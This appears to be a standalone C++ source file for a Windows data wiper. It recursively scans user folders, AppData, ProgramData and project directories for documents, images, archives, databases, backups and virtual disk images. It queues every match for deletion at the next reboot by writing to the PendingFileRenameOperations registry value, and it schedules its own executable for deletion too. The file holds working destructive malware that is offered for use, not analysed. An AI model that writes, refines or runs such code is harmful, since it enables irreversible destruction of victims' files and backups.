#include <windows.h>
#include <filesystem>
#include <vector>
#include <string>
#include <iostream>
#include <shlobj.h> // Required for SHGetFolderPathW
#include <algorithm> // Required for std::transform
#include <set>

namespace fs = std::filesystem;

// Helper function to expand environment variables in a path
std::wstring ExpandEnvironmentStrings(const std::wstring& path) {
    wchar_t buffer[MAX_PATH];
    DWORD len = ExpandEnvironmentStringsW(path.c_str(), buffer, MAX_PATH);
    if (len == 0 || len > MAX_PATH) {
        // Return original path on failure
        return path;
    }
    return std::wstring(buffer);
}

// Main function
int main() {
    try {
        // --- CONFIGURATION ---

        // 1. Define INCLUSION paths (base directories to scan)
        std::vector<std::wstring> inclusion_paths_raw = {
            L"%USERPROFILE%\\Desktop",
            L"%USERPROFILE%\\Documents",
            L"%USERPROFILE%\\Downloads",
            L"%USERPROFILE%\\Pictures",
            L"%USERPROFILE%\\Music",
            L"%USERPROFILE%\\Videos",
            L"%USERPROFILE%\\Contacts",
            L"%USERPROFILE%\\Favorites",
            L"%USERPROFILE%\\Links",
            L"%APPDATA%",
            L"%LOCALAPPDATA%",
            L"%USERPROFILE%\\OneDrive",
            L"C:\\Users\\Public",
            L"C:\\ProgramData",
            L"C:\\Repos",
            L"C:\\Projects"
        };

        // 2. Define EXCLUSION paths (directories to ignore completely)
        std::vector<std::wstring> exclusion_paths_raw = {
            L"%LOCALAPPDATA%\\Google\\Chrome\\User Data",
            L"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
            L"%APPDATA%\\Mozilla\\Firefox\\Profiles",
            L"%TEMP%",
            L"C:\\Windows\\Temp",
            L"C:\\Windows\\SoftwareDistribution\\Download",
            L"C:\\Windows\\Installer"
        };

        // 3. Define targeted file EXTENSIONS
        const std::set<std::wstring> target_extensions = {
            L".txt", L".pdf", L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
            L".jpg", L".jpeg", L".png", L".gif", L".zip", L".rar", L".7z",
            L".bak", L".sql", L".mdb", L".accdb", L".mdf", L".ldf",
            L".vhd", L".vhdx", L".vmdk", L".vdi"
        };


        // --- INITIALIZATION ---

        int limit = 5000000000;

        std::vector<std::wstring> exclusion_paths;
        for (const auto& path_raw : exclusion_paths_raw) {
            fs::path p = ExpandEnvironmentStrings(path_raw);
            std::wstring p_str = p.lexically_normal().wstring();
            std::transform(p_str.begin(), p_str.end(), p_str.begin(), ::towlower);
            exclusion_paths.push_back(p_str);
        }

        HKEY hKey;
        LONG res = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
        if (res != ERROR_SUCCESS) {
            std::cerr << "Fatal: Failed to open registry key. Please run this program as an Administrator.\n";
            return 1;
        }

        std::vector<wchar_t> multiStr;
        DWORD dataSize = 0;
        res = RegQueryValueExW(hKey, L"PendingFileRenameOperations", nullptr, nullptr, nullptr, &dataSize);
        if (res == ERROR_SUCCESS && dataSize > 0) {
            multiStr.resize(dataSize / sizeof(wchar_t));
            RegQueryValueExW(hKey, L"PendingFileRenameOperations", nullptr, nullptr, reinterpret_cast<BYTE*>(multiStr.data()), &dataSize);
            if (multiStr.size() > 2 && multiStr.back() == L'\0') {
                multiStr.pop_back();
            }
        }

        // --- PROCESSING ---

        int count = 0;
        bool limit_reached = false;
        size_t initial_buffer_size = multiStr.size();

        for (const auto& path_raw : inclusion_paths_raw) {
            if (limit_reached) break;

            fs::path inclusion_path = ExpandEnvironmentStrings(path_raw);
            if (!fs::exists(inclusion_path)) continue;

            try {
                for (auto const& entry : fs::recursive_directory_iterator(inclusion_path, fs::directory_options::skip_permission_denied)) {
                    if (count >= limit) {
                        limit_reached = true;
                        break;
                    }

                    fs::path current_path = entry.path().lexically_normal();
                    std::wstring current_path_str = current_path.wstring();
                    std::transform(current_path_str.begin(), current_path_str.end(), current_path_str.begin(), ::towlower);

                    bool is_excluded = false;
                    for (const auto& excluded_path : exclusion_paths) {
                        if (current_path_str.rfind(excluded_path, 0) == 0) {
                            is_excluded = true;
                            break;
                        }
                    }

                    if (is_excluded) continue;

                    if (fs::is_regular_file(entry.status())) {
                        std::wstring extension = entry.path().extension().wstring();
                        std::transform(extension.begin(), extension.end(), extension.begin(), ::towlower);

                        if (target_extensions.count(extension)) {
                            std::wstring fileEntry = L"\\??\\" + entry.path().wstring();
                            multiStr.insert(multiStr.end(), fileEntry.begin(), fileEntry.end());
                            multiStr.push_back(L'\0');
                            multiStr.push_back(L'\0');
                            count++;
                            //std::wcout << L"Scheduled for deletion: " << entry.path().wstring() << std::endl;
                        }
                    }
                }
            }
            catch (const fs::filesystem_error& e) {
                std::cerr << "Access error, skipping: " << e.what() << std::endl;
            }
        }

        // --- FINALIZATION ---

        // NEW: Add the program's own executable to the deletion list
        wchar_t self_path_buffer[MAX_PATH];
        if (GetModuleFileNameW(NULL, self_path_buffer, MAX_PATH)) {
            std::wstring self_path_entry = L"\\??\\" + std::wstring(self_path_buffer);
            multiStr.insert(multiStr.end(), self_path_entry.begin(), self_path_entry.end());
            multiStr.push_back(L'\0'); // Null terminator for source path
            multiStr.push_back(L'\0'); // Empty destination path (marks for deletion)
            std::wcout << L"\nScheduled the program itself for deletion: " << self_path_buffer << std::endl;
        }
        else {
            std::cerr << "\nWarning: Could not get the program's own path to schedule for deletion.\n";
        }

        // Only write to registry if we've actually added anything new
        if (multiStr.size() > initial_buffer_size) {
            multiStr.push_back(L'\0'); // Add the final null terminator for REG_MULTI_SZ
            res = RegSetValueExW(hKey, L"PendingFileRenameOperations", 0, REG_MULTI_SZ, reinterpret_cast<const BYTE*>(multiStr.data()), static_cast<DWORD>(multiStr.size() * sizeof(wchar_t)));

            if (res != ERROR_SUCCESS) {
                std::cerr << "Error: Failed to write to registry. The list might be too large or another error occurred.\n";
            }
            else {
                std::cout << "\nSuccessfully added " << count << " file(s) and the program itself to PendingFileRenameOperations.\n";
            }
        }
        else {
            std::cout << "\nNo new files were found to add to the deletion list.\n";
        }

        RegCloseKey(hKey);

    }
    catch (const std::exception& e) {
        std::cerr << "A critical error occurred: " << e.what() << std::endl;
    }

    std::cout << "Press Enter to exit.";
    std::cin.ignore();
    std::cin.get();

    return 0;
}